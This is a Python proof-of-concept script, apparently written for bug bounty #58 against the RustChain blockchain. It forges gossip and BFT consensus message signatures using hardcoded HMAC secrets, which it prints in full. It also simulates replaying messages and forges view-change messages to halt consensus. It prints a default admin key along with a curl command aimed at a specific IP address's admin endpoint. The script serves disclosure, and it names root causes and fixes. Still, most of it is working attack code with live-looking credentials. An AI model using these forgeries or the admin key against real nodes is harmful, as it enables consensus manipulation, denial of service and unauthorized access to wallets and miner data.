#!/usr/bin/env python3
"""
PoC: Cross-Node Consensus Attacks — Bounty #58

Demonstrates:
1. Forged gossip messages using hardcoded P2P secret
2. Forged BFT consensus messages using shared HMAC key
3. Message replay within TTL window
4. View change DoS

NOTE: All tests are LOCAL simulations. No production nodes are contacted.
"""

import hashlib
import hmac
import json
import time

# ═══════════════════════════════════════════════════════════
# The hardcoded secrets from the source code
# ═══════════════════════════════════════════════════════════

# From rustchain_p2p_gossip.py line 31:
P2P_SECRET = "rustchain_p2p_secret_2025_decentralized"

# From fleet_immune_system.py / multiple files:
ADMIN_KEY = "rustchain_admin_key_2025_secure64"

# BFT consensus uses the same shared secret for all nodes
BFT_SECRET = P2P_SECRET  # "all nodes share key in testnet"


def sign_gossip_message(content: str) -> tuple:
    """Forge a valid gossip message signature using the hardcoded secret."""
    timestamp = int(time.time())
    message = f"{content}:{timestamp}"
    sig = hmac.new(P2P_SECRET.encode(), message.encode(), hashlib.sha256).hexdigest()
    return sig, timestamp


def sign_bft_message(msg_type: str, view: int, epoch: int, digest: str) -> str:
    """Forge a valid BFT consensus message signature."""
    timestamp = int(time.time())
    sign_data = f"{msg_type}:{view}:{epoch}:{digest}:{timestamp}"
    return hmac.new(
        BFT_SECRET.encode(),
        sign_data.encode(),
        hashlib.sha256
    ).hexdigest()


# ═══════════════════════════════════════════════════════════
# PoC 1: Forged Gossip Messages
# ═══════════════════════════════════════════════════════════

def poc_forged_gossip():
    print("\n" + "=" * 60)
    print("PoC 1: FORGED GOSSIP MESSAGES")
    print("=" * 60)

    # Forge an INV message announcing fake attestation data
    fake_content = json.dumps({
        "type": "inv",
        "items": [
            {"type": "attestation", "hash": "deadbeef" * 8},
            {"type": "balance_update", "hash": "cafebabe" * 8}
        ],
        "sender": "attacker-node",
        "ttl": 3
    })

    sig, ts = sign_gossip_message(fake_content)

    print(f"  Secret used: {P2P_SECRET}")
    print(f"  Forged signature: {sig}")
    print(f"  Timestamp: {ts}")
    print(f"  Message: {fake_content[:100]}...")

    # Verify our forged signature matches what the real code would produce
    verify_message = f"{fake_content}:{ts}"
    expected = hmac.new(P2P_SECRET.encode(), verify_message.encode(), hashlib.sha256).hexdigest()
    valid = hmac.compare_digest(sig, expected)

    print(f"\n  Signature valid: {valid}")
    print("""
    IMPACT: Any attacker who reads the public source code can:
    - Inject fake INV messages to announce nonexistent data
    - Inject fake attestations into the gossip network
    - Inject fake balance updates across all nodes
    - Impersonate any node in the P2P network
    """)


# ═══════════════════════════════════════════════════════════
# PoC 2: Forged BFT Consensus Messages
# ═══════════════════════════════════════════════════════════

def poc_forged_bft():
    print("\n" + "=" * 60)
    print("PoC 2: FORGED BFT CONSENSUS MESSAGES")
    print("=" * 60)

    epoch = 12345
    view = 0
    fake_digest = hashlib.sha256(b"attacker-controlled-state").hexdigest()

    # Forge PRE-PREPARE (leader message)
    pre_prepare_sig = sign_bft_message("pre_prepare", view, epoch, fake_digest)
    print(f"  Forged PRE-PREPARE for epoch {epoch}:")
    print(f"    Digest: {fake_digest[:32]}...")
    print(f"    Signature: {pre_prepare_sig}")

    # Forge PREPARE (validator agreement)
    prepare_sig = sign_bft_message("prepare", view, epoch, fake_digest)
    print(f"\n  Forged PREPARE:")
    print(f"    Signature: {prepare_sig}")

    # Forge COMMIT (final commitment)
    commit_sig = sign_bft_message("commit", view, epoch, fake_digest)
    print(f"\n  Forged COMMIT:")
    print(f"    Signature: {commit_sig}")

    print("""
    IMPACT: With 3 nodes and shared keys, an attacker can:
    - Forge PRE-PREPARE to propose malicious state
    - Forge enough PREPARE messages to reach 2/3 threshold
    - Forge COMMIT messages to finalize fake consensus
    - All without compromising any actual node

    ROOT CAUSE: All nodes share the same HMAC key.
    Real PBFT requires per-node asymmetric keypairs (Ed25519/RSA).
    """)


# ═══════════════════════════════════════════════════════════
# PoC 3: Message Replay Attack
# ═══════════════════════════════════════════════════════════

def poc_message_replay():
    print("\n" + "=" * 60)
    print("PoC 3: MESSAGE REPLAY WITHIN TTL WINDOW")
    print("=" * 60)

    MESSAGE_EXPIRY = 300  # From source code

    content = json.dumps({"type": "commit", "epoch": 100, "digest": "abc123"})
    sig, ts = sign_gossip_message(content)

    # Check if message is still valid at various times
    for offset in [0, 60, 120, 240, 299, 301]:
        simulated_now = ts + offset
        age = simulated_now - ts
        valid = age < MESSAGE_EXPIRY
        print(f"  t+{offset:3d}s: age={age}s, valid={valid}")

    print(f"""
    Messages are valid for {MESSAGE_EXPIRY}s (5 minutes).
    No nonce or message-ID deduplication exists.

    Attack: Capture a valid COMMIT message from the network,
    replay it within the 5-minute window to:
    - Double-count votes in consensus
    - Force re-acceptance of old state transitions
    - Amplify a single node's vote to appear as multiple nodes

    FIX: Add unique message IDs + dedup set per TTL window.
    """)


# ═══════════════════════════════════════════════════════════
# PoC 4: View Change DoS
# ═══════════════════════════════════════════════════════════

def poc_view_change_dos():
    print("\n" + "=" * 60)
    print("PoC 4: VIEW CHANGE DENIAL OF SERVICE")
    print("=" * 60)

    VIEW_CHANGE_TIMEOUT = 90  # From source code

    # Forge view change messages
    for view in range(5):
        sig = sign_bft_message("view_change", view, 0, "")
        print(f"  Forged VIEW_CHANGE for view={view}: sig={sig[:16]}...")

    print(f"""
    VIEW_CHANGE_TIMEOUT = {VIEW_CHANGE_TIMEOUT}s

    Attack sequence:
    1. Forge VIEW_CHANGE messages (trivial with hardcoded secret)
    2. Send to all nodes every {VIEW_CHANGE_TIMEOUT}s
    3. Nodes constantly rotate leader → no consensus ever completes
    4. Settlement halts → no rewards distributed → economic DoS

    Cost: Near zero (one HTTP request per {VIEW_CHANGE_TIMEOUT}s)
    Impact: Complete consensus halt
    """)


# ═══════════════════════════════════════════════════════════
# PoC 5: Hardcoded Admin Key
# ═══════════════════════════════════════════════════════════

def poc_admin_key():
    print("\n" + "=" * 60)
    print("PoC 5: HARDCODED ADMIN KEY")
    print("=" * 60)

    print(f"""
    Default admin key: {ADMIN_KEY}

    Found in multiple files as os.environ.get("RC_ADMIN_KEY", "{ADMIN_KEY}")

    If the environment variable is not set (common in dev/staging), 
    anyone can authenticate as admin:

    curl -H "X-Admin-Key: {ADMIN_KEY}" \\
      https://50.28.86.131/admin/fleet/report

    This grants access to:
    - Fleet detection reports (all miner fleet scores)
    - Miner hardware fingerprints
    - Admin-only wallet operations
    """)


# ═══════════════════════════════════════════════════════════
# Run all PoCs
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("Cross-Node Consensus Red Team PoC — Bounty #58")
    print("All tests are LOCAL. No production nodes contacted.")
    print("=" * 60)

    poc_forged_gossip()
    poc_forged_bft()
    poc_message_replay()
    poc_view_change_dos()
    poc_admin_key()

    print("\n" + "=" * 60)
    print("All PoCs complete.")
    print("See consensus-redteam-report.md for full analysis.")
    print("=" * 60)
